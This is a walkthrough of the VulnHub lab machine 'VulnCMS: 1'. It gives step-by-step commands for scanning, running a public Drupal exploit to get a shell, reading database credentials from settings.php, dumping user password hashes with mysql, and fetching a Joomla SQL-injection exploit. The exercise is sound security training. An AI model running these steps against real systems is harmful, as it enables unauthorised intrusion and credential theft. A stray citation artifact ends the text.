# VulnCMS: 1

- **Machine:** VulnCMS: 1
- **Download:** https://www.vulnhub.com/entry/vulncms-1,710/

![](827-1.png)

---

# Machine Setup

1. Import the **OVA** file into VirtualBox.
2. Click **Finish**.
3. Start the virtual machine.

---

# Network Scanning

## Discover the Target IP

Identify the target machine on the local network.

```bash
nmap -sn 192.168.2.0/24
```

![](827-2.png)

---

## Full Nmap Scan

Perform a complete TCP scan with service detection, default NSE scripts, operating system detection, and version enumeration.

```bash
nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.125
```

![](827-3.png)

---

## Optional Enumeration

Scan all TCP ports.

```bash
nmap -v -p- 192.168.2.125
```

Run the default service enumeration.

```bash
nmap -sC -sV -A 192.168.2.125
```

---

## HTTP Enumeration

Run the HTTP enumeration NSE script.

```bash
nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.125
```

![](827-4.png)

---

# Web Enumeration

Browse the discovered web resources.

```text
http://192.168.2.125/
```

```text
http://192.168.2.125/home.html
```

```text
http://192.168.2.125/robots.txt
```

```text
http://192.168.2.125/about.html
```

![](827-5.png)

---

## Configure Local Hostname

Add the virtual host entry.

```bash
nano /etc/hosts
```

Example:

```text
192.168.2.125 fsociety.web
```

![](827-6.png)

Browse the discovered services.

```text
http://fsociety.web:5000/
```

```text
http://192.168.2.125:8081/
```

```text
http://192.168.2.125:9001/
```

---

# Drupal Enumeration

The service running on port **9001** is identified as Drupal.

Search for a suitable exploit.

```text
https://www.exploit-db.com/exploits/44449
```

![](827-7.png)

Execute the exploit.

```bash
ruby 44449.rb 192.168.2.125:9001
```

A Drupal shell is obtained.

![](827-8.png)

---

# Local Enumeration

List the current directory.

```bash
ls
```

![](827-9.png)

Read the Drupal configuration file.

```bash
cat sites/default/settings.php
```

The database credentials are disclosed.

![](827-10.png)

---

# Database Enumeration

Verify database access.

```bash
mysql -u drupal_admin -p'p@$$_C!rUP@!_cM5' -e "show databases;"
```

![](827-11.png)

Display all tables.

```bash
mysql -u drupal_admin -p'p@$$_C!rUP@!_cM5' -D drupal_db -e "show tables;"
```

Dump user credentials.

```bash
mysql -u drupal_admin -p'p@$$_C!rUP@!_cM5' -D drupal_db -e "select uid,name,pass from users;"
```

![](827-12.png)

Recovered credentials:

```text
Username : admin_cms_drupal
Hash     : $S$DADmuahqIEcfhp8mqTQ/ystjAyQdBA46h/VXbd89wutU4aKRmNpi
```

---

## Identify the Password Hash

Determine the hash type.

```bash
hashid '$S$DADmuahqIEcfhp8mqTQ/ystjAyQdBA46h/VXbd89wutU4aKRmNpi'
```

![](827-13.png)

The hash is identified as a Drupal password hash.

---

# Joomla Enumeration

Another web application is running on **port 8081**.

Enumerate the Joomla installation.

```bash
joomscan -u http://192.168.2.125:8081
```

![](827-14.png)

Identify a public exploit.

```text
https://www.exploit-db.com/exploits/38534
```

![](827-15.png)

Download the exploit.

Using SearchSploit:

```bash
searchsploit -m 38534
```

Or directly:

```bash
wget https://www.exploit-db.com/raw/38534 -O joomla_sqli.py
```

![](827-16.png)

---

# Vulnerability Summary

| No. | Vulnerability | Impact |
|-----|---------------|--------|
| 1 | Outdated Drupal installation | Remote Code Execution |
| 2 | Plaintext database credentials stored in configuration | Database compromise |
| 3 | Direct database access | Credential disclosure |
| 4 | Drupal password hash disclosure | Offline password cracking |
| 5 | Outdated Joomla installation | SQL Injection / Information Disclosure |
| 6 | Multiple outdated CMS applications | Increased attack surface |

---

# Key Learning

- Enumerate every open web service individually because different ports may host different applications.
- Drupal's `settings.php` commonly contains database credentials after code execution is obtained.
- Database access frequently exposes user accounts and password hashes.
- Always fingerprint CMS versions using dedicated tools such as **JoomScan** and **SearchSploit**.
- Multiple vulnerable CMS installations on the same server significantly increase the likelihood of compromise.

---

# Summary

The assessment began with comprehensive network enumeration, revealing multiple web services running on different ports. The Drupal instance hosted on port **9001** was found to be vulnerable to a known Remote Code Execution vulnerability, providing shell access to the application. Local enumeration uncovered the `settings.php` configuration file, exposing valid database credentials. These credentials were used to enumerate the Drupal database and recover administrator password hashes. Further reconnaissance identified a Joomla installation on port **8081**, which was fingerprinted with **JoomScan**, revealing another publicly known vulnerability. The machine demonstrates how outdated CMS deployments, exposed configuration files, and insecure credential management can combine to create multiple attack paths. :contentReference[oaicite:0]{index=0}